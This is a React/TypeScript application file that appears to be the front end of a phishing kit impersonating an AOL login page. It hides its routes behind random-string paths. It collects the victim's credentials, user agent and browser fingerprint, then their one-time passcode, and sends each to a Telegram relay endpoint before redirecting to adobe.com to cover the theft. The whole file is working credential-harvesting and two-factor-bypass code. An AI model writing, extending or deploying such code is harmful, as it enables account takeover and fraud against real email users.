import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate } from 'react-router-dom';
import AolLoginPage from './components/AolLoginPage';
import OtpPage from './components/OtpPage';
import MobileOtpPage from './components/mobile/MobileOtpPage';
import Spinner from './components/common/Spinner';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { config } from './config';

const safeSendToTelegram = async (payload: any) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
  } catch (fetchErr) {
    console.error('safeSendToTelegram failed:', fetchErr);
  }
};

// Obfuscated route paths
const ROUTES = {
  HOME: '/2x1wz9i3eezdpjuai1kpm6xfc62ub9l3',
  OTP: '/vmemb75a2dmbhv898xqhshsiiskoollb',
};

function App() {
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
  const [isLoading, setIsLoading] = useState(false);
  const [loginFlowState, setLoginFlowState] = useState({
    awaitingOtp: false,
    sessionData: null as any,
  });

  const navigate = useNavigate();

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  const handleLoginSuccess = async (loginData: any) => {
    // This is the handler for the second password attempt.
    setIsLoading(true);
    const browserFingerprint = await getBrowserFingerprint();
    const credentialsData = {
      ...loginData,
      sessionId: Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ...browserFingerprint,
    };
    
    await safeSendToTelegram({ type: 'credentials', data: credentialsData });
    
    setLoginFlowState({
      awaitingOtp: true,
      sessionData: credentialsData,
    });
    setIsLoading(false);
    navigate(ROUTES.OTP, { replace: true });
  };
  
  const handleOtpSubmit = async (otp: string) => {
    if (!loginFlowState.sessionData) {
      navigate(ROUTES.HOME, { replace: true });
      return;
    }
    
    setIsLoading(true);
    await safeSendToTelegram({
      type: 'otp',
      data: { otp, session: loginFlowState.sessionData },
    });
    
    window.location.href = 'https://www.adobe.com';
  };

  if (isLoading) {
    return <div className="min-h-screen bg-gray-100 flex items-center justify-center"><div className="text-center"><Spinner size="lg" /><p className="text-gray-600 mt-4">Loading...</p></div></div>;
  }

  const OtpComponent = isMobile ? MobileOtpPage : OtpPage;

  return (
    <Routes>
      <Route path={ROUTES.HOME} element={<AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} />} />
      <Route path={ROUTES.OTP} element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to={ROUTES.HOME} replace />} />
      <Route path="*" element={<Navigate to={ROUTES.HOME} replace />} />
    </Routes>
  );
}

export default App;
